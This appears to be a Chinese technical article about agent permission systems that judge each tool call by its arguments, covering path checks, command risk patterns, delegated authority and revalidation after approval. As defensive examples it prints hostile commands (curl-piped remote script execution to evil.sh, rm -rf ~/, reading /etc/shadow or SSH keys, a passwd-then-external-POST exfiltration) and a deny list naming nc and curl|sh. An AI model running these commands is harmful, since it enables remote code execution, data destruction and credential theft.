# 不是开关，是判定：agent 权限系统怎么按参数内容决定放行

给 agent 配权限，最常见的做法是列一张工具白名单：允许调 `read_file`，不允许调 `delete_file`。

这张表在 demo 里能用。到了生产环境，它会在两个方向上同时失效。

一是**放得太宽**。`run_command` 在白名单里，因为 agent 需要跑测试。但这个工具既能执行 `pytest`，也能执行 `rm -rf /`。白名单管不住。

二是**卡得太死**。你把 `run_command` 拿掉，agent 就没法跑测试，任务做不完，业务方第二天就来投诉。

问题的根源在于：**权限的单位不是「工具」，是「工具加上这一次的参数」。**

2026 年几家企业级 agent 框架的升级，都不约而同地改了这一点。这篇文章讲这个改动具体长什么样。

## 一、先看清白名单的失效边界

### 1.1 同一个工具，风险完全不同

把 `run_command` 的调用摊开看：

| 命令 | 实际风险 |
| --- | --- |
| `pytest tests/` | 无 |
| `git status` | 无 |
| `pip install requests` | 低，但改了环境 |
| `curl http://internal-api/admin/reset` | 高，触发了内部接口 |
| `rm -rf ./build` | 中，删了构建产物 |
| `rm -rf ~/` | 极高 |
| `bash -c "$(curl -s http://evil.sh)"` | 极高，且命令内容在运行时才确定 |

（示例为本文构造，用于说明同一工具下的风险差异。）

七条调用，一个工具名。白名单只能回答「允不允许调 `run_command`」，回答不了「这一次该不该允许」。

### 1.2 三种典型的绕过

白名单在真实对抗下会被三种方式绕过。

**第一种：参数注入。**

工具本身是安全的，参数被污染了。比如 `read_file(path)`，路径来自用户输入。用户输入 `../../etc/shadow`，或者 `~/.ssh/id_rsa`。工具名合法，参数越界。

**第二种：解释器嵌套。**

`run_command("python -c '...'")`。外层命令看起来无害，内层是任意代码。再套一层 `bash -c`，静态字符串匹配基本失效。

**第三种：组合越权。**

单个调用都在权限内，组合起来超出范围。比如先 `read_file("/etc/passwd")` 再 `http_post("http://external/", data)`。两步单独看都允许，合起来是数据外泄。

前两种可以靠参数级检查挡住。第三种要靠跨调用的行为分析，目前还没有成熟方案，只能靠出口管控和审计发现。

这篇文章主要讲前两种，因为它们是当下有工程解法的部分。

## 二、判定不再是布尔值

### 2.1 三个结果，不是一个

企业级框架现在普遍把判定结果从「允许 / 拒绝」改成三个值：

```text
ALLOW     直接执行
APPROVAL  挂起，等用户确认
DENY      拒绝，并把原因返回给模型
```

中间这个值是最关键的。

它承认了一个现实：**大部分「可疑但不确定」的操作，不该被硬拦，也不该被放行，而该被人看一眼。**

这和「拒绝」有本质区别。拒绝会让 agent 卡死——它不知道该换个做法还是该停。而「等确认」给了它一个明确的信号：这一步需要人。

从工程角度，这个三值结果还解决了一个隐性问题：**审计**。被拒绝的调用和被人批准后执行的调用，在日志里是两类事件，追责路径不同。

### 2.2 判定输入有三类

AgentScope 2.0 的权限系统把判定依据分成三层（来源：AgentScope 2.0 发布说明，java.agentscope.io）：

| 层 | 内容 | 例子 |
| --- | --- | --- |
| 静态规则 | 预先配置的策略 | 「财务工具仅限财务部门」「生产环境禁止写操作」 |
| 工具类型 | 这个工具的固有风险类别 | 文件读写、命令执行、网络请求、数据库操作 |
| 输入内容 | 这一次调用的实际参数 | 路径是不是危险目录、命令里有没有高风险模式 |

（表中「例子」列为本文补充，非发布说明原文。）

三层是**串联**的，不是并联的。任何一层给出 DENY，最终就是 DENY；任何一层给出 APPROVAL，最终就是 APPROVAL。

这个结构的好处是可解释：被拦的时候，你能说清是哪一层的哪条规则拦的。

```text
决策 = 静态规则(主体, 工具, 上下文)
      ⊕ 工具类型策略(工具类别)
      ⊕ 内容检查(参数)
```

`⊕` 表示按「最严格者胜」合并。

### 2.3 为什么顺序重要

三层评估有个隐含的顺序：**先粗后细**。

静态规则最便宜——查表就行。工具类型次之——查策略表。内容检查最贵——要解析参数、匹配模式、可能还要调外部服务。

先跑便宜的，一旦 DENY 就直接返回，不用跑后面两层。这在调用量大时能省下可观的 CPU。

但顺序也有个反直觉的地方：**内容检查可能推翻静态规则的「允许」**。静态规则说「财务部门可以用财务工具」，但这一次的参数是「把全年预算表导出到外部地址」，内容检查仍然要拦。

所以正确的表述是：静态规则给的是**上限**，内容检查是在上限之内再做一次收窄。

## 三、文件工具：路径是唯一的攻击面

### 3.1 危险目录清单

文件类工具的检查，核心是路径。

需要拦的目标大致这几类（清单为工程归纳，参考 AgentScope 2.0 权限系统的描述，非规范原文）：

| 类别 | 例子 | 为什么 |
| --- | --- | --- |
| 系统配置 | `/etc/`、`C:\Windows\` | 改了就影响整机 |
| 凭据 | `~/.ssh/`、`~/.aws/`、`.env` | 直接泄露密钥 |
| 用户数据 | `~/.config/`、浏览器 profile | 隐私 |
| 项目外路径 | `../` 逃逸出工作目录 | 越界 |
| 挂载点 | `/proc/`、`/sys/` | 内核接口 |

AgentScope 的做法是维护这样一份清单，在文件工具执行前检查解析后的**真实路径**（来源：AgentScope 2.0 发布说明，文件工具查危险目录与敏感文件）。

注意「真实路径」三个字。检查 `path` 字符串是不够的，因为：

- 符号链接可以指向别处
- `..` 可以逃逸
- 大小写不敏感的文件系统（macOS 默认）可以让 `~/.SSH` 匹配到 `~/.ssh`

正确做法是先 `realpath` 解析成绝对路径，再判断是否在允许的根目录之下：

```python
# 概念伪代码：路径检查的正确顺序
def check_path(raw_path, allowed_roots, denied_prefixes):
    real = os.path.realpath(raw_path)          # 先解析符号链接和 ..
    if not any(real.startswith(r) for r in allowed_roots):
        return DENY, "outside allowed roots"
    if any(real.startswith(d) for d in denied_prefixes):
        return DENY, "sensitive path"
    return ALLOW, None
```

顺序不能反。如果先做前缀匹配再做 realpath，`../` 就绕过去了。

### 3.2 写操作要单独定级

读和写要分开。同一个路径，读可能允许，写必须拦。

`/etc/hosts` 读一下没什么，写进去就能劫持域名解析。

所以策略表通常是二维的：路径类别 × 操作类型（下表为本文设计的示例策略，非任何框架的默认配置）。

| 路径类别 | 读 | 写 | 删 |
| --- | --- | --- | --- |
| 工作目录内 | 允许 | 允许 | 审批 |
| 工作目录外 | 审批 | 拒绝 | 拒绝 |
| 凭据目录 | 拒绝 | 拒绝 | 拒绝 |
| 系统目录 | 审批 | 拒绝 | 拒绝 |

这张表看起来繁琐，但它是可以穷举的——路径类别有限，操作类型只有三种。这比「判断这次操作安不安全」要可靠得多。

## 四、命令工具：静态匹配的天花板

### 4.1 高风险命令模式

命令执行的检查，第一层是模式匹配（清单为工程归纳，非任何框架的默认规则）：

| 模式 | 风险 |
| --- | --- |
| `rm -rf` | 递归删除 |
| `chmod 777` | 权限放开 |
| `curl ... \| sh` | 远程代码执行 |
| `> /dev/sda` | 写裸设备 |
| `mkfs` | 格式化 |
| `dd if=` | 裸写 |
| `sudo` | 提权 |
| `nc -l` | 反弹 shell 监听 |

这一层能挡住明显的危险操作，但挡不住精心构造的。

### 4.2 动态 shell 是真正的难点

最难处理的是命令内容在**运行时才确定**的情况：

```text
bash -c "$(curl -s http://example.com/script.sh)"
bash -c "$CMD"
eval "$USER_INPUT"
python -c "import os; os.system(input())"
```

外层字符串看起来完全正常。危险内容要么来自网络，要么来自变量，静态分析拿不到。

工程上有三条应对路径，按可靠性排序：

**第一条，禁止动态构造。** 直接拦掉 `bash -c`、`eval`、`sh -c` 这类会引入二级解释的模式。这是最可靠的，但会误伤——有些合法场景确实需要。

**第二条，允许但降级。** 遇到动态 shell 结构，判定结果从 ALLOW 降为 APPROVAL。人能看懂的让他看，看不出来的就拒。AgentScope 的权限系统走的是这条路：识别出动态 shell 结构和未知行为时，自动进入用户审批（来源：AgentScope 2.0 发布说明）。

**第三条，沙箱兜底。** 承认静态检查不可靠，把执行放到隔离环境里，靠环境边界保证安全。这一条是必要的，但它不是权限系统的职责，是执行层的职责。

三条要一起用。只靠第三条，等于放弃了事前控制；只靠第一条，agent 会寸步难行。

### 4.3 一个容易被忽略的维度：工作目录

同一条命令，在不同目录下风险不同。

`rm -rf *` 在 `/tmp/workspace-abc123/` 下是清理临时文件，在 `/` 下是灾难。

所以命令检查要带上**当前工作目录**。这条看起来显然，但很多实现只检查命令字符串，不看上下文。

## 五、有效权限：四个集合的交集

前面讲的是「这一次调用该不该放行」。还有一个更上层的问题：**这个 agent 到底有多少权限。**

Aklivity 在一份 AI Gateway 白皮书里给了一个公式，是目前见过最清楚的表达（来源：Aklivity《The State of AI Gateways in 2026》，厂商白皮书）：

```text
effective authority
  = user authority
  ∩ agent authority
  ∩ delegated task authority
  ∩ transaction policy
```

四个集合取交集：

- **user authority**：发起者本人的权限
- **agent authority**：这个 agent 被授予的权限上限
- **delegated task authority**：这一次任务需要的权限
- **transaction policy**：这一笔事务适用的策略

取最小的那个。配套的原则是：**每次委托只能收窄，永不放大。**

### 5.1 一个具体的链条

Alice 发起采购，交给采购 agent，采购 agent 再交给下单 agent，最后落到 SAP（示例改编自 Aklivity 白皮书中的委托链场景）。

| 环节 | 约束 |
| --- | --- |
| Alice | 有权发起采购，金额上限 50000 |
| 采购 agent | 可询价、可建单，金额上限 25000 |
| 下单 agent | 不能审批，不能放款 |
| 事务策略 | 超过 10000 要走财务审批 |

（具体金额为本文设定的示例，非白皮书原文数字。）

那么下单 agent 这一次的有效权限，是这四个条件的交集：

- 金额上限 10000（事务策略最严）
- 不能审批（下单 agent 自身限制）
- 不能放款（同上）
- 必须走财务审批

它看到的是「Alice 的采购请求」，但它能做的事，比 Alice 本人少得多。

这个模型的价值在于：**它让「权限收窄」变成一个可验证的数学性质，而不是一句口号。**

每一跳委托，都要能证明「新权限 ⊆ 旧权限」。证明不了，就是设计缺陷。

### 5.2 权限要随事务结束而失效

一个常被忽略的点：委托是有生命周期的。

采购任务结束，采购 agent 拿到的那些权限就应该失效。如果它拿着一个长期有效的 token，下次被别的任务调用时，权限还在。

工程上的做法是把权限绑定到**事务 ID**，而不是绑定到 agent 实例：

```text
token claims = {
  sub: "agent:purchase-bot",
  act: { sub: "user:alice" },        # 代表谁行动
  txn: "po-2026-0042",               # 绑定到具体事务
  scope: "po:create po:read",
  exp: <事务预期结束时间>
}
```

`act` 这个字段（actor）是 OAuth 里的扩展，用来表达「A 代表 B 行动」（来源：RFC 8693，OAuth 2.0 Token Exchange）。有了它，日志里才能回答「这个动作是谁的意思」。

## 六、两个维度，别混为一谈

讲到这里，需要把两个容易混淆的分级方式分开。

### 6.1 动作风险三级

按**动作的可逆性**分（来源：Aklivity《The State of AI Gateways in 2026》）：

| 级别 | 例子 | 控制 |
| --- | --- | --- |
| READ | 查 CRM、查库、取文档 | 可自动执行 |
| WRITE | 改记录、建工单、改合同 | 强校验、审计、幂等 |
| IRREVERSIBLE | 转账、部署生产、删数据 | 提权、审批、检查点、回滚、熔断 |

（「例子」列为本文补充。）

这个分级回答的是：**这一步做错了，能不能撤回。**

### 6.2 决策权三级

按**决策权归属**分（来源：《智能体规范应用与创新发展实施意见》第 6 条，网信办等三部门，2026-05-08）：

- 仅限用户本人决策
- 需由用户授权决策
- 智能体自主决策

这个分级回答的是：**这一步的决定，该由谁来做。**

### 6.3 两者正交

关键在于：**它们不是同一个维度。**

同一笔转账：

- 可以是「本人决策」——用户自己点确认
- 可以是「授权决策」——用户预先批准了每月自动还款
- 可以是「自主决策」——agent 判断这是常规账单直接付

三种情况下，动作风险都是 IRREVERSIBLE，但决策权归属不同，所需的**证据链**也不同（下表为本文归纳，非监管文件要求）：

| 决策权 | 需要留下什么证据 |
| --- | --- |
| 本人决策 | 用户的操作记录、确认时间、确认内容 |
| 授权决策 | 授权范围、授权有效期、本次是否在范围内 |
| 自主决策 | 判定依据、置信度、策略版本、可回滚点 |

这就是为什么权限模型里要有一个**决策权字段**，而不只是一个风险等级字段。

很多现有 agent 框架只有后者。它们能说「这个操作是高风险的」，但说不清「这个决定是谁做的」。

## 七、把判定做成运行时状态

最后一个工程要点：**审批不是一个弹窗，是一个状态。**

如果把审批实现成「弹个框，用户点确定，然后继续」，会有个隐蔽的问题：从弹框到执行之间，世界变了。

- 用户点确认的时候，价格是 1000；执行的时候，涨到 1200
- 用户确认的时候，他有这个权限；执行的时候，他被调岗了
- 用户确认的时候，库存有货；执行的时候，卖完了

正确的状态机是这样的（来源：Aklivity《The State of AI Gateways in 2026》，审批作为运行时状态的描述）：

```text
RUNNING
  → Action Proposed
  → Policy Evaluation
  → WAITING_FOR_APPROVAL
  → REVALIDATE          ← 关键的一步
  → EXECUTE
```

`REVALIDATE` 的意思是：**批准之后、执行之前，把条件重新检查一遍。**

检查什么？

- 身份还有效吗（token 没过期、人没离职）
- 权限还在吗（没被撤销）
- 前置条件还成立吗（价格、库存、预算）
- 审批本身还有效吗（有没有超时）

不通过就回到 `WAITING_FOR_APPROVAL` 或者直接终止。

这一步在很多实现里被省掉了，因为它让流程变复杂。但省掉它的代价是：**审批失去了意义**。用户批准的是「当时的那个请求」，不是「现在的这个请求」。

## 八、验收清单

如果你要评估一个框架的权限系统，我会用这几条（清单为本文提出的评估项，非行业标准）：

**1. 判定结果是二值还是三值？**

只有允许/拒绝的，生产环境会很难用。中间态是必须的。

**2. 检查是工具级还是参数级？**

只查工具名的，前面那三种绕过全部挡不住。

**3. 路径检查做没做 realpath？**

没做的，`../` 就能逃逸。

**4. 动态 shell 怎么处理？**

如果答案是「不处理」或者「靠正则」，那这条防线基本不存在。

**5. 权限有没有绑定事务？**

没有的，权限会一直累积，越用越宽。

**6. 审批之后有没有 revalidate？**

没有的，审批批准的是一个已经过期的请求。

**7. 日志能不能回答「谁批的」？**

只能回答「谁做的」不够。审计要的是完整链条：谁发起、谁执行、谁批准、依据什么策略。

---

权限这件事，在 demo 阶段几乎不存在——一个 API key 就够了。它是在第一次出事故之后才被想起来的东西。

但 2026 年的一个明显变化是：**它开始被前置到架构设计阶段。** 不是因为大家变谨慎了，是因为 agent 真的开始动生产数据了。

一个只能生成文本的模型，权限再大也就写点错字。一个能调接口、能改数据库、能部署的 agent，权限设计错了，损失是实打实的。
